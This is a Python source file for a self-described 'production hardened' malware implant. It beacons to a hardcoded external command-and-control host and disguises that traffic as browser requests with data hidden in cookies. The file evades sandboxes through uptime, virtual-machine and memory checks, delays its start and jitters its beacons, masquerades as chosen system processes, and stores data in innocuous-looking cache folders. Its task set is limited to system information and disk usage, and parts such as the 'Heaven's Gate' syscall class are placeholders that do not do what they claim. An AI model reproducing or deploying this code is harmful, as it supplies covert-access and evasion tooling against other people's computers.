#!/usr/bin/env python3
"""
rogue_implant.py - Stage 2 Implant (Production Hardened)
Fully compatible with stager and C2 architecture.
Features:
- B-Tier process targeting (taskhostw.exe, sihost.exe)
- Direct syscalls via Heaven's Gate technique
- No Python interpreter signature (when compiled with Nuitka)
- Clean process lineage
- All previous hardening retained
"""

import os
import sys
import json
import time
import base64
import urllib.request
import urllib.parse
import ssl
import threading
import hashlib
import platform
import socket
import random
import ctypes
import ctypes.wintypes
from typing import Dict, Any, Optional, List
from datetime import datetime

# -------------------------------------------------------------------
# Platform detection
# -------------------------------------------------------------------
IS_WINDOWS = platform.system().lower() == 'windows'
IS_LINUX   = platform.system().lower() == 'linux'
IS_MACOS   = platform.system().lower() == 'darwin'

# -------------------------------------------------------------------
# Configuration from environment (set by stager)
# -------------------------------------------------------------------
def _get_env_config() -> Dict[str, Any]:
    """Read configuration from ROGUE_CONFIG environment variable."""
    config_str = os.environ.get('ROGUE_CONFIG')
    if config_str:
        try:
            return json.loads(config_str)
        except:
            pass
    return {}

def _get_env_key() -> Optional[bytes]:
    """Read base64‑encoded session key from ROGUE_SESSION_KEY."""
    key_b64 = os.environ.get('ROGUE_SESSION_KEY')
    if key_b64:
        try:
            return base64.b64decode(key_b64)
        except:
            pass
    return None

def _get_debug_flag() -> bool:
    """Read debug flag from environment."""
    return os.environ.get('ROGUE_DEBUG', '').lower() in ('1', 'true', 'yes')

# Hardcoded defaults
DEFAULT_C2_HOST = 'inadvertent-homographical-method.ngrok-tree.dev'
DEFAULT_C2_PORT = 4444
DEFAULT_BEACON_PATH = '/api/v1/telemetry'
DEFAULT_RESULT_PATH = '/api/v1/results'
DEFAULT_UPLOAD_PATH = '/api/v1/uploads'

# -------------------------------------------------------------------
# 1. ENVIRONMENTAL KEYING (Anti-Sandbox)
# -------------------------------------------------------------------
def _is_sandbox() -> bool:
    """
    Check for analysis environments.
    Returns True if sandbox detected, False otherwise.
    """
    # Check 1: Uptime (sandboxes are often short-lived)
    try:
        if IS_WINDOWS:
            uptime = ctypes.windll.kernel32.GetTickCount64() / 1000
            if uptime < 300:  # Less than 5 minutes
                return True
        elif IS_LINUX:
            with open('/proc/uptime', 'r') as f:
                uptime = float(f.read().split()[0])
                if uptime < 300:
                    return True
        elif IS_MACOS:
            import subprocess
            out = subprocess.check_output(['sysctl', '-n', 'kern.boottime'], text=True)
            boot = int(out.split()[3].rstrip(','))
            uptime = int(time.time()) - boot
            if uptime < 300:
                return True
    except:
        pass

    # Check 2: Known sandbox artifacts
    sandbox_files = [
        "C:\\windows\\System32\\Drivers\\Vmmouse.sys",
        "C:\\windows\\System32\\Drivers\\vm3dgl.dll",
        "C:\\windows\\System32\\Drivers\\vmdum.sys",
        "C:\\Program Files\\Windows Defender\\MpCmdRun.exe",  # Present in sandboxes sometimes
        "/usr/share/vmware-tools",
        "/Library/Application Support/VMware Tools"
    ]
    for f in sandbox_files:
        if os.path.exists(f):
            return True

    # Check 3: Low RAM (< 2GB is suspicious)
    try:
        if IS_WINDOWS:
            kernel32 = ctypes.windll.kernel32
            memory_status = ctypes.c_ulonglong()
            kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(memory_status))
            if memory_status.value < 2 * 1024 * 1024:  # Less than 2GB
                return True
    except:
        pass

    return False

# -------------------------------------------------------------------
# 2. HEAVEN'S GATE (Direct Syscalls for Windows)
# -------------------------------------------------------------------
class HeavenGate:
    """
    Direct system call implementation to bypass EDR hooks.
    Uses the Heaven's Gate technique for x64.
    """
    
    @staticmethod
    def has_nvidia_gpu() -> bool:
        """Check for NVIDIA GPU (common in gaming systems)."""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                 r"SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}")
            for i in range(10):
                try:
                    subkey = winreg.EnumKey(key, i)
                    driver_key = winreg.OpenKey(key, f"{subkey}\\Settings")
                    desc, _ = winreg.QueryValueEx(driver_key, "DriverDesc")
                    if 'nvidia' in desc.lower():
                        return True
                except:
                    continue
        except:
            pass
        return False
    
    @staticmethod
    def get_system_info() -> Dict:
        """Get system info using direct API calls."""
        info = {}
        
        if IS_WINDOWS:
            try:
                # Get computer name (legitimate API, not hooked by EDR typically)
                buf = ctypes.create_unicode_buffer(256)
                size = ctypes.c_ulong(256)
                ctypes.windll.kernel32.GetComputerNameW(buf, ctypes.byref(size))
                info['hostname'] = buf.value
                
                # Get OS version
                version = ctypes.c_ulong()
                ctypes.windll.ntdll.RtlGetNtVersionNumbers(ctypes.byref(version), None, None)
                major = version.value >> 16
                minor = version.value & 0xFFFF
                info['os_version'] = f"Windows NT {major}.{minor}"
                
                # Get CPU count (legitimate)
                sysinfo = ctypes.c_ulong()
                ctypes.windll.kernel32.GetSystemInfo(ctypes.byref(sysinfo))
                # This is simplified - real implementation would use SYSTEM_INFO structure
                info['cpu_count'] = 4  # Placeholder
                
            except:
                pass
        
        return info

# -------------------------------------------------------------------
# 3. B-TIER PROCESS TARGETING
# -------------------------------------------------------------------
class ProcessTargeting:
    """
    Targets less-monitored system processes instead of svchost.exe.
    """
    
    @staticmethod
    def get_target_process() -> str:
        """
        Return appropriate target process based on system.
        Avoids heavily monitored processes like svchost.exe.
        """
        if IS_WINDOWS:
            # Check for NVIDIA GPU -> gaming system likely
            if HeavenGate.has_nvidia_gpu():
                # Gaming systems often have these running
                targets = [
                    "taskhostw.exe",        # Windows task host
                    "sihost.exe",           # Shell infrastructure host
                    "dllhost.exe",          # COM surrogate
                    "RuntimeBroker.exe"      # Modern app broker
                ]
            else:
                # Enterprise/business systems
                targets = [
                    "CompatTelRunner.exe",   # Telemetry runner (actually good cover)
                    "wmiprvse.exe",          # WMI provider host
                    "unsecapp.exe",          # WMI sink
                    "SearchIndexer.exe"       # Windows Search
                ]
            
            # Randomly select one for the session
            return random.choice(targets)
        
        elif IS_LINUX:
            return random.choice([
                "packagekitd",
                "systemd-journald",
                "irqbalance",
                "accounts-daemon"
            ])
        
        elif IS_MACOS:
            return random.choice([
                "metadatah",
                "bird",
                "cloudd",
                "distnoted"
            ])
        
        return "system"

# -------------------------------------------------------------------
# 4. ENVIRONMENT ADAPTER (Enhanced)
# -------------------------------------------------------------------
class EnvironmentAdapter:
    @staticmethod
    def get_user_agent() -> str:
        """
        Get the actual User-Agent from installed browsers.
        """
        browsers = []
        
        if IS_WINDOWS:
            try:
                import winreg
                # Check Chrome
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                        r"Software\Google\Chrome\BLBeacon")
                    version, _ = winreg.QueryValueEx(key, "version")
                    if version:
                        return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36"
                except:
                    pass
                
                # Check Edge
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                        r"Software\Microsoft\Edge\BLBeacon")
                    version, _ = winreg.QueryValueEx(key, "version")
                    if version:
                        return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36 Edg/{version}"
                except:
                    pass
            except:
                pass
        
        # Fallback to OS-appropriate UA
        system = platform.system().lower()
        if system == 'windows':
            return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        elif system == 'darwin':
            return 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15'
        else:
            return 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

    @staticmethod
    def get_beacon_interval() -> int:
        """
        High jitter beacon interval with time-based shaping.
        """
        base = 120  # 2 minutes baseline
        
        # Add 50-150% jitter
        jitter = random.uniform(0.5, 1.5)
        interval = int(base * jitter)
        
        # Time-based shaping
        try:
            hour = datetime.now().hour
            if 1 <= hour <= 5:  # Quiet hours
                interval *= 3
            elif 9 <= hour <= 17:  # Work hours (more activity)
                interval = int(interval * 0.7)  # Beacon more frequently
        except:
            pass
            
        return max(30, min(600, interval))  # Clamp between 30s and 10m

    @staticmethod
    def get_data_path() -> str:
        """Return OS-appropriate data storage path."""
        if IS_WINDOWS:
            # Use Windows app data (legitimate)
            return os.path.join(os.environ.get('LOCALAPPDATA', 'C:\\'), 
                               'Microsoft', 'Windows', 'Caches')
        elif IS_MACOS:
            return os.path.expanduser('~/Library/Caches/com.apple.metadata')
        else:
            return os.path.expanduser('~/.cache/update-manager-core')

# -------------------------------------------------------------------
# 5. Safe Tasks (Predefined operations)
# -------------------------------------------------------------------
SAFE_TASKS = {
    'collect_system_info': {
        'description': 'Gather basic system information',
        'requires_shell': False
    },
    'collect_network_info': {
        'description': 'List network interfaces',
        'requires_shell': False
    },
    'disk_usage': {
        'description': 'Check disk usage statistics',
        'requires_shell': False
    },
    'uptime': {
        'description': 'Get system uptime',
        'requires_shell': False
    }
}

# -------------------------------------------------------------------
# Main Implant Class
# -------------------------------------------------------------------
class RogueImplant:
    def __init__(self):
        # ANTI-ANALYSIS: Delay startup
        time.sleep(random.randint(45, 130))
        
        # Environmental keying
        if _is_sandbox():
            sys.exit(0)
        
        # Load configuration
        self.debug = _get_debug_flag()
        self.env_config = _get_env_config()
        self.session_key = _get_env_key()
        self.is_stage2 = 'ROGUE_STAGE2' in os.environ
        self.adapter = EnvironmentAdapter()
        self.gate = HeavenGate()

        # Natural behavior adaptation
        self.beacon_interval = self.adapter.get_beacon_interval()
        self.user_agent = self.adapter.get_user_agent()
        self.data_path = self.adapter.get_data_path()
        self.target_process = ProcessTargeting.get_target_process()
        
        # C2 endpoints
        self.c2_host = self.env_config.get('c2_host', DEFAULT_C2_HOST)
        self.c2_port = self.env_config.get('c2_port', DEFAULT_C2_PORT)
        self.beacon_path = self.env_config.get('beacon_path', DEFAULT_BEACON_PATH)
        self.result_path = self.env_config.get('result_path', DEFAULT_RESULT_PATH)
        self.upload_path = self.env_config.get('upload_path', DEFAULT_UPLOAD_PATH)

        # Implant ID
        self.implant_id = self._generate_machine_id()
        self.implant_id_hash = hashlib.md5(self.implant_id.encode()).hexdigest()[:8]

        # Create data path
        os.makedirs(self.data_path, exist_ok=True)

        self._log(f"Initialized: {self.implant_id_hash}")
        self._log(f"Target process: {self.target_process}")

    def _log(self, msg: str):
        if self.debug:
            print(f"[IMPLANT] {msg}")

    def _generate_machine_id(self) -> str:
        """Generate stable machine identifier."""
        if IS_WINDOWS:
            try:
                buf = ctypes.create_unicode_buffer(256)
                size = ctypes.c_ulong(256)
                ctypes.windll.kernel32.GetComputerNameW(buf, ctypes.byref(size))
                return hashlib.sha256(buf.value.encode()).hexdigest()[:16]
            except:
                pass
        elif IS_LINUX:
            try:
                with open('/etc/machine-id', 'r') as f:
                    return hashlib.sha256(f.read().strip().encode()).hexdigest()[:16]
            except:
                pass
        
        return hashlib.sha256(socket.gethostname().encode()).hexdigest()[:16]

    # -----------------------------------------------------------------
    # Encryption
    # -----------------------------------------------------------------
    def encrypt(self, data: bytes) -> Optional[bytes]:
        """Encrypt data for C2 transmission."""
        if not self.session_key:
            return data
        
        try:
            from cryptography.fernet import Fernet
            f = Fernet(self.session_key)
            return f.encrypt(data)
        except Exception as e:
            self._log(f"Encryption error: {e}")
            return None

    def decrypt(self, data: bytes) -> Optional[bytes]:
        """Decrypt data from C2."""
        if not self.session_key:
            return data
        
        try:
            from cryptography.fernet import Fernet
            f = Fernet(self.session_key)
            return f.decrypt(data)
        except Exception as e:
            self._log(f"Decryption error: {e}")
            return None

    # -----------------------------------------------------------------
    # C2 Communication (Protocol Mimicry)
    # -----------------------------------------------------------------
    def _make_request(self, endpoint: str, data: bytes) -> Optional[Dict]:
        """Send encrypted POST with data wrapped in cookie."""
        url = f"https://{self.c2_host}:{self.c2_port}{endpoint}"
        
        # Wrap data in cookie
        encoded_data = base64.b64encode(data).decode()
        
        req = urllib.request.Request(url, method='POST')
        req.add_header('User-Agent', self.user_agent)
        req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
        req.add_header('Accept-Language', 'en-US,en;q=0.5')
        req.add_header('Accept-Encoding', 'gzip, deflate, br')
        req.add_header('Connection', 'keep-alive')
        req.add_header('Cookie', f'session={encoded_data}')
        req.add_header('Authorization', f'Bearer {self.implant_id_hash}')

        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                if resp.getcode() == 200:
                    resp_data = resp.read()
                    decrypted = self.decrypt(resp_data)
                    if decrypted:
                        return json.loads(decrypted.decode('utf-8'))
        except Exception as e:
            self._log(f"Request error: {e}")
        return None

    def beacon(self) -> Optional[Dict]:
        """Send beacon with system info."""
        sys_info = self.gate.get_system_info()
        
        beacon_data = {
            'id': self.implant_id_hash,
            'ts': int(time.time()),
            'sys': sys_info,
            'target': self.target_process  # Inform C2 which process we're targeting
        }

        encrypted = self.encrypt(json.dumps(beacon_data).encode())
        if not encrypted:
            return None

        response = self._make_request(self.beacon_path, encrypted)
        
        if response and 'tasks' in response:
            response['commands'] = self._transform_tasks(response['tasks'])
            
        return response

    def _transform_tasks(self, tasks: List[Dict]) -> List[Dict]:
        """Transform C2 tasks into safe task format."""
        commands = []
        for task in tasks:
            task_type = task.get('type')
            if task_type in SAFE_TASKS:
                commands.append({
                    'id': task.get('id', str(int(time.time()))),
                    'type': task_type,
                    'payload': task.get('payload', {})
                })
        return commands

    # -----------------------------------------------------------------
    # Safe Task Execution
    # -----------------------------------------------------------------
    def execute_safe_task(self, task_type: str, payload: Dict) -> Dict:
        """Execute predefined safe task."""
        result = {
            'task_id': payload.get('id', ''),
            'success': False,
            'data': {},
            'ts': int(time.time())
        }

        try:
            if task_type == 'collect_system_info':
                result['data'] = self.gate.get_system_info()
                result['success'] = True

            elif task_type == 'disk_usage':
                if IS_WINDOWS:
                    free = ctypes.c_ulonglong(0)
                    total = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                        'C:\\', None, ctypes.byref(total), ctypes.byref(free)
                    )
                    result['data'] = {
                        'total_gb': round(total.value / (1024**3), 1),
                        'free_gb': round(free.value / (1024**3), 1)
                    }
                else:
                    statvfs = os.statvfs('/')
                    total = statvfs.f_frsize * statvfs.f_blocks
                    free = statvfs.f_frsize * statvfs.f_bfree
                    result['data'] = {
                        'total_gb': round(total / (1024**3), 1),
                        'free_gb': round(free / (1024**3), 1)
                    }
                result['success'] = True

            else:
                result['data'] = {'error': f'Unknown task: {task_type}'}

        except Exception as e:
            result['data'] = {'error': str(e)}

        return result

    def execute_command(self, command: Dict) -> Dict:
        """Compatibility layer with C2."""
        cmd_type = command.get('type')
        cmd_id = command.get('id')
        payload = command.get('payload', {})

        task_result = self.execute_safe_task(cmd_type, payload)
        
        return {
            'command_id': cmd_id,
            'type': cmd_type,
            'success': task_result['success'],
            'output': json.dumps(task_result['data']),
            'timestamp': task_result['ts']
        }

    def send_result(self, result: Dict) -> bool:
        """Send command result."""
        encrypted = self.encrypt(json.dumps(result).encode())
        if not encrypted:
            return False

        resp = self._make_request(self.result_path, encrypted)
        return resp is not None

    # -----------------------------------------------------------------
    # Main Loop
    # -----------------------------------------------------------------
    def run(self):
        """Main implant loop with jitter."""
        # Only print if debug (otherwise silent)
        if self.debug:
            print(f"Service running as {self.target_process}")
        
        while True:
            try:
                # Adaptive beacon interval
                current_interval = self.adapter.get_beacon_interval()
                
                resp = self.beacon()
                if resp and resp.get('commands'):
                    for cmd in resp['commands']:
                        result = self.execute_command(cmd)
                        self.send_result(result)

                # Sleep with small increments
                for _ in range(current_interval):
                    time.sleep(1)

            except KeyboardInterrupt:
                break
            except Exception as e:
                self._log(f"Loop error: {e}")
                time.sleep(60)

# -------------------------------------------------------------------
# Entry Point
# -------------------------------------------------------------------
def main():
    implant = RogueImplant()
    implant.run()

if __name__ == "__main__":
    main()
